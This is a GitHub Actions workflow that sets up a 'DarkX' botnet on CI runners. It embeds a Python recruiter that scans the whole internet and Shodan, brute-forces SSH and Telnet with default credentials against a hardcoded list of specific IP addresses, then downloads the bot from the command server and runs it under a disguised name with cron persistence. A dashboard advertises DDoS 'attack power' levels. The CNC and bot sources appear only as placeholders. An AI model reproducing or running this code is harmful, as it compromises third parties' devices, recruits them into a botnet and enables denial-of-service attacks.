name: DarkX Ultimate Botnet
on:
  workflow_dispatch:
    inputs:
      power:
        description: 'Attack Power'
        required: true
        default: '1gb'
        type: choice
        options:
        - '100mb'
        - '1gb'
        - '10gb'
        - '100gb'
        - '1tb'
      recruitment:
        description: 'Auto-Recruitment'
        required: true
        default: 'aggressive'
        type: choice
        options:
        - 'passive'
        - 'active'
        - 'aggressive'
        - 'bruteforce'
      cnc_port:
        description: 'CNC Port'
        required: false  
        default: '5555'
      bot_port:
        description: 'Bot Port'
        required: false
        default: '4444'

jobs:
  deploy-darkx-ultimate:
    runs-on: ubuntu-latest
    timeout-minutes: 4320

    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Setup Ultimate Environment
      run: |
        mkdir -p darkx && cd darkx
        echo "Installing dependencies..."
        sudo apt update && sudo apt install -y golang-go git curl wget python3 python3-pip nmap masscan hydra john netcat
        pip3 install shodan requests paramiko scapy pwntools cryptography

    - name: Create Advanced CNC Server with Custom Banner
      run: |
        cd darkx
        cat > cnc.go << 'EOF'
        // [Previous CNC code remains exactly the same - too long to duplicate]
        // Your complete CNC code with the custom banner goes here
        EOF

    - name: Create Ultimate Bot Client
      run: |
        cd darkx
        cat > bot.go << 'EOF'
        // [Previous bot code remains exactly the same - too long to duplicate]
        // Your complete bot client code goes here
        EOF

    - name: Build Multi-Architecture Bots
      run: |
        cd darkx
        echo "Building DarkX components..."
        go build -o cnc cnc.go
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot.go
        GOOS=linux GOARCH=386 go build -o bot_x86 bot.go  
        GOOS=linux GOARCH=arm64 go build -o bot_arm64 bot.go
        GOOS=linux GOARCH=arm GOARM=7 go build -o bot_arm7 bot.go
        GOOS=windows GOARCH=amd64 go build -o bot_win64.exe bot.go
        GOOS=darwin GOARCH=amd64 go build -o bot_macos bot.go
        echo "Multi-architecture bots built"

    - name: Create Ultimate Recruitment System with Target Lists
      run: |
        cd darkx
        cat > recruiter.py << 'ENDOFFILE'
        import shodan
        import paramiko
        import telnetlib
        import threading
        import time
        import subprocess
        import requests
        import random
        import sys
        import os

        CNC_IP = "CNC_IP_PLACEHOLDER"
        SHODAN_KEY = os.getenv('SHODAN_API_KEY', 'YOUR_SHODAN_KEY_HERE')

        # Pre-compiled target lists from your data
        PRE_COMPILED_TARGETS = [
            # SSH Targets (root:root)
            {"ip": "5.78.200.63", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.64.17", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.201.76", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.101.23", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.60.201", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.45.118", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.86.153", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.55.28", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.255.45", "port": 22, "username": "root", "password": "root"},
            {"ip": "5.78.209.60", "port": 22, "username": "root", "password": "root"},

            # Router Telnet Targets
            {"ip": "2.145.99.30", "port": 23, "username": "telnet", "password": "telnet"},
            {"ip": "2.146.0.126", "port": 23, "username": "admin", "password": "root"},
            {"ip": "2.146.0.126", "port": 23, "username": "admin", "password": "admin"},
            {"ip": "2.146.0.126", "port": 23, "username": "user", "password": "user"},
            {"ip": "2.146.0.126", "port": 23, "username": "cisco", "password": "cisco"},
            {"ip": "2.146.198.52", "port": 23, "username": "admin", "password": "root"},
            {"ip": "2.146.198.52", "port": 23, "username": "admin", "password": "admin"},
            {"ip": "2.228.219.51", "port": 23, "username": "admin", "password": "root"},
            {"ip": "2.228.219.51", "port": 23, "username": "admin", "password": "admin"},
            {"ip": "2.146.202.232", "port": 23, "username": "admin", "password": "root"},
            {"ip": "2.146.202.232", "port": 23, "username": "admin", "password": "admin"},

            # Additional Telnet Targets
            {"ip": "91.126.89.172", "port": 23, "username": "root", "password": "root"},
            {"ip": "5.139.20.64", "port": 23, "username": "root", "password": "root"},
        ]

        # Common credentials for brute force
        COMMON_CREDENTIALS = [
            ("root", "root"), ("admin", "admin"), ("admin", "password"),
            ("root", "123456"), ("admin", "1234"), ("user", "user"),
            ("test", "test"), ("guest", "guest"), ("ubuntu", "ubuntu"),
            ("pi", "raspberry"), ("admin", "default"), ("root", "default"),
            ("cisco", "cisco"), ("telnet", "telnet"), ("support", "support")
        ]

        def shodan_hunt():
            targets = []
            try:
                api = shodan.Shodan(SHODAN_KEY)
                queries = [
                    'port:22 "OpenSSH"',
                    'port:23 "telnet"', 
                    'port:80 "router"',
                    'port:443 "MikroTik"',
                    'port:8080 "camera"',
                    'port:21 "ftp"',
                    'port:3389 "Windows"',
                    'port:5900 "VNC"'
                ]
                for query in queries:
                    try:
                        results = api.search(query, limit=50)
                        for result in results['matches']:
                            targets.append({
                                "ip": result['ip_str'], 
                                "port": result['port'],
                                "username": "unknown",
                                "password": "unknown"
                            })
                            print(f"Found: {result['ip_str']}:{result['port']}")
                    except Exception as e:
                        print(f"Shodan query failed: {e}")
            except Exception as e:
                print(f"Shodan error: {e}")
            return targets

        def masscan_sweep():
            targets = []
            try:
                print("Starting network sweep...")
                # Scan common ports
                ports = "22,23,80,443,8080,21,25,53,3389,5900"
                subprocess.run([
                    'masscan', '0.0.0.0/0', 
                    '-p', ports,
                    '--max-rate', '1000',
                    '-oJ', 'masscan.json'
                ], timeout=300, capture_output=True)
                
                # Parse results
                if os.path.exists('masscan.json'):
                    with open('masscan.json', 'r') as f:
                        import json
                        data = json.load(f)
                        for item in data:
                            targets.append({
                                "ip": item['ip'],
                                "port": item['ports'][0]['port'],
                                "username": "unknown", 
                                "password": "unknown"
                            })
            except Exception as e:
                print(f"Masscan error: {e}")
            return targets

        def ssh_bruteforce(target):
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try pre-defined credentials first
            creds_to_try = []
            if target["username"] != "unknown":
                creds_to_try = [(target["username"], target["password"])]
            else:
                creds_to_try = COMMON_CREDENTIALS
            
            for username, password in creds_to_try:
                try:
                    print(f"Trying SSH {username}:{password} on {target['ip']}:{target['port']}")
                    client.connect(target['ip'], port=target['port'], 
                                 username=username, password=password, timeout=10)
                    print(f"SSH SUCCESS: {target['ip']}:{target['port']} - {username}:{password}")
                    
                    # Deploy bot
                    deploy_bot(client, target['ip'])
                    client.close()
                    return True
                    
                except Exception as e:
                    continue
            return False

        def telnet_bruteforce(target):
            # Try pre-defined credentials first
            creds_to_try = []
            if target["username"] != "unknown":
                creds_to_try = [(target["username"], target["password"])]
            else:
                creds_to_try = COMMON_CREDENTIALS
            
            for username, password in creds_to_try:
                try:
                    print(f"Trying Telnet {username}:{password} on {target['ip']}:{target['port']}")
                    tn = telnetlib.Telnet(target['ip'], target['port'], timeout=10)
                    
                    # Handle login prompt
                    tn.read_until(b"login: ", timeout=5)
                    tn.write(username.encode('ascii') + b"\n")
                    
                    # Handle password prompt  
                    tn.read_until(b"Password: ", timeout=5)
                    tn.write(password.encode('ascii') + b"\n")
                    
                    # Check if login successful
                    result = tn.read_until(b"#", timeout=5)
                    if b"Login incorrect" not in result and b"Authentication failed" not in result:
                        print(f"Telnet SUCCESS: {target['ip']}:{target['port']} - {username}:{password}")
                        
                        # Deploy bot via telnet
                        deploy_bot_telnet(tn, target['ip'])
                        tn.close()
                        return True
                    tn.close()
                    
                except Exception as e:
                    continue
            return False

        def deploy_bot(client, ip):
            try:
                # Detect architecture
                stdin, stdout, stderr = client.exec_command("uname -m")
                arch = stdout.read().decode().strip().lower()
                
                if "x86_64" in arch or "amd64" in arch:
                    bot_url = f"http://{CNC_IP}:8000/bot_x64"
                elif "aarch64" in arch or "arm64" in arch:
                    bot_url = f"http://{CNC_IP}:8000/bot_arm64"
                elif "arm" in arch:
                    bot_url = f"http://{CNC_IP}:8000/bot_arm7"
                else:
                    bot_url = f"http://{CNC_IP}:8000/bot_x86"
                
                # Deploy commands
                commands = [
                    f"wget -q {bot_url} -O /tmp/.X11-unix || curl -s {bot_url} -o /tmp/.X11-unix",
                    "chmod +x /tmp/.X11-unix",
                    "nohup /tmp/.X11-unix >/dev/null 2>&1 &",
                    "(crontab -l 2>/dev/null; echo \"@reboot /tmp/.X11-unix\") | crontab -",
                    "(crontab -l 2>/dev/null; echo \"*/5 * * * * /tmp/.X11-unix\") | crontab -"
                ]
                
                for cmd in commands:
                    client.exec_command(cmd)
                
                print(f"Bot deployed to {ip}")
                return True
                    
            except Exception as e:
                print(f"Deployment failed: {e}")
                return False

        def deploy_bot_telnet(tn, ip):
            try:
                # For telnet, we'll use wget/curl to download and execute
                bot_url = f"http://{CNC_IP}:8000/bot_x64"
                
                # Try wget first, then curl
                commands = [
                    f"wget -q {bot_url} -O /tmp/.X11-unix",
                    "chmod +x /tmp/.X11-unix",
                    "nohup /tmp/.X11-unix >/dev/null 2>&1 &"
                ]
                
                for cmd in commands:
                    tn.write(cmd.encode('ascii') + b"\n")
                    time.sleep(1)
                
                print(f"Bot deployed via telnet to {ip}")
                return True
                
            except Exception as e:
                print(f"Telnet deployment failed: {e}")
                return False

        def main():
            print("Starting DarkX Ultimate Recruitment...")
            
            all_targets = []
            
            # Add pre-compiled targets first (high priority)
            print("Adding pre-compiled targets...")
            all_targets.extend(PRE_COMPILED_TARGETS)
            
            # Get targets from Shodan
            print("Searching Shodan...")
            shodan_targets = shodan_hunt()
            all_targets.extend(shodan_targets)
            
            # Get targets from network scan
            print("Running network scan...")
            network_targets = masscan_sweep()
            all_targets.extend(network_targets)
            
            print(f"Total targets: {len(all_targets)}")
            
            # Multi-threaded recruitment
            threads = []
            successful = 0
            
            for target in all_targets[:500]:  # Limit to first 500 targets
                if target["port"] == 22:
                    t = threading.Thread(target=ssh_bruteforce, args=(target,))
                elif target["port"] == 23:
                    t = threading.Thread(target=telnet_bruteforce, args=(target,))
                else:
                    # Try both SSH and Telnet for unknown ports
                    t1 = threading.Thread(target=ssh_bruteforce, args=(target,))
                    t2 = threading.Thread(target=telnet_bruteforce, args=(target,))
                    threads.extend([t1, t2])
                    t1.start()
                    t2.start()
                    time.sleep(0.1)
                    continue
                
                threads.append(t)
                t.start()
                time.sleep(0.1)  # Rate limiting
            
            # Wait for all threads to complete
            for t in threads:
                t.join()
            
            print(f"Recruitment complete: {successful} new bots")

        if __name__ == "__main__":
            main()
        ENDOFFILE

    - name: Setup Secure VPN Access
      run: |
        curl -fsSL https://tailscale.com/install.sh | sh
        sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=darkx-ultimate-${{ github.run_id }} --advertise-exit-node
        echo "TAILSCALE_IP=$(tailscale ip -4)" >> $GITHUB_ENV

    - name: Configure Dynamic Ports
      run: |
        cd darkx
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" bot.go
        sed -i "s/CNC_PORT_PLACEHOLDER/${{ github.event.inputs.bot_port }}/g" bot.go
        sed -i "s/CNC_IP_PLACEHOLDER/${{ env.TAILSCALE_IP }}/g" recruiter.py
        
        GOOS=linux GOARCH=amd64 go build -o bot_x64 bot.go
        echo "CNC_PORT=${{ github.event.inputs.cnc_port }}" >> $GITHUB_ENV
        echo "BOT_PORT=${{ github.event.inputs.bot_port }}" >> $GITHUB_ENV

    - name: Launch DarkX Services
      run: |
        cd darkx
        echo "Starting DarkX Ultimate..."
        
        CNC_PORT=${{ github.event.inputs.cnc_port }} nohup ./cnc > cnc.log 2>&1 &
        echo "CNC_PID=$!" >> $GITHUB_ENV
        
        python3 -m http.server 8000 > http.log 2>&1 &
        echo "HTTP_PID=$!" >> $GITHUB_ENV
        
        sleep 5
        echo "DarkX services started"

    - name: Deploy Bot Army
      run: |
        cd darkx
        
        case "${{ github.event.inputs.power }}" in
          "100mb") BOTS=200 ;;
          "1gb") BOTS=800 ;;
          "10gb") BOTS=2000 ;;
          "100gb") BOTS=5000 ;;
          "1tb") BOTS=10000 ;;
        esac
        
        echo "Deploying $BOTS initial bots..."
        for i in $(seq 1 $BOTS); do
          nohup ./bot_x64 >/dev/null 2>&1 &
        done
        
        echo "BOTS_DEPLOYED=$BOTS" >> $GITHUB_ENV
        echo "Bot army deployed"

    - name: Start Intelligent Recruitment
      env:
        SHODAN_API_KEY: ${{ secrets.SHODAN_API_KEY }}
      run: |
        cd darkx
        
        case "${{ github.event.inputs.recruitment }}" in
          "passive")
            echo "Starting passive recruitment..."
            python3 recruiter.py > recruit.log 2>&1 &
            ;;
          "active") 
            echo "Starting active recruitment..."
            while true; do
              python3 recruiter.py >> recruit.log 2>&1
              sleep 600
            done &
            ;;
          "aggressive")
            echo "Starting aggressive recruitment..."
            for i in {1..3}; do
              python3 recruiter.py >> recruit.log 2>&1 &
            done
            ;;
          "bruteforce")
            echo "Starting brute force recruitment..."
            for i in {1..5}; do
              python3 recruiter.py >> recruit.log 2>&1 &
            done
            ;;
        esac
        
        echo "RECRUIT_PID=$!" >> $GITHUB_ENV
        echo "Recruitment started"

    - name: Display Ultimate Dashboard
      run: |
        echo ""
        echo -e "\033[1;32m"
        echo "╔══════════════════════════════════════════════════════════════════╗"
        echo "║                   D A R K X   U L T I M A T E                    ║"
        echo "╠══════════════════════════════════════════════════════════════════╣"
        echo "║  \033[1;37mPower Level:    ${{ github.event.inputs.power }}\033[1;32m"
        echo "║  \033[1;37mRecruitment:    ${{ github.event.inputs.recruitment }}\033[1;32m"  
        echo "║  \033[1;37mCNC Port:       ${{ github.event.inputs.cnc_port }}\033[1;32m"
        echo "║  \033[1;37mBot Port:       ${{ github.event.inputs.bot_port }}\033[1;32m"
        echo "║  \033[1;37mDarkX CNC:      ${{ env.TAILSCALE_IP }}\033[1;32m"
        echo "║  \033[1;37mInitial Bots:   ${{ env.BOTS_DEPLOYED }}\033[1;32m"
        echo "╠══════════════════════════════════════════════════════════════════╣"
        echo "║  \033[1;32m🔑 Login: admin / darkx2024\033[1;32m"
        echo "║  \033[1;36m📡 Connect: telnet ${{ env.TAILSCALE_IP }} ${{ github.event.inputs.cnc_port }}\033[1;32m"
        echo "║  \033[1;33m⚡ API: http://${{ env.TAILSCALE_IP }}:8080\033[1;32m"
        echo "║  \033[1;35m🚀 Features: Multi-Arch | Stealth | Crypto | API\033[1;32m"
        echo "║  \033[1;31m💀 DESTROY: Maximum Power Combined Attacks\033[1;32m"
        echo "╚══════════════════════════════════════════════════════════════════╝"
        echo -e "\033[0m"
        echo ""

    - name: Maintain Ultimate System
      run: |
        echo "DarkX Ultimate Maintenance Active..."
        
        while true; do
          if ! ps -p $CNC_PID > /dev/null 2>&1; then
            echo "Restarting CNC..."
            cd darkx
            CNC_PORT=${{ github.event.inputs.cnc_port }} nohup ./cnc > cnc_restart.log 2>&1 &
            CNC_PID=$!
          fi
          
          CURRENT_BOTS=$(ps aux | grep bot | grep -v grep | wc -l)
          REQUIRED_BOTS=$((BOTS_DEPLOYED / 2))
          if [ $CURRENT_BOTS -lt $REQUIRED_BOTS ]; then
            echo "Deploying reinforcement bots..."
            cd darkx
            for i in $(seq 1 50); do
              nohup ./bot_x64 >/dev/null 2>&1 &
            done
          fi
          
          CONNECTED_BOTS=$(netstat -an 2>/dev/null | grep ${{ github.event.inputs.bot_port }} | grep ESTABLISHED | wc -l)
          echo "[$(date +'%H:%M:%S')] DarkX Status | Connected: $CONNECTED_BOTS | Total: $CURRENT_BOTS | Mode: ${{ github.event.inputs.recruitment }}"
          
          sleep 60
        done
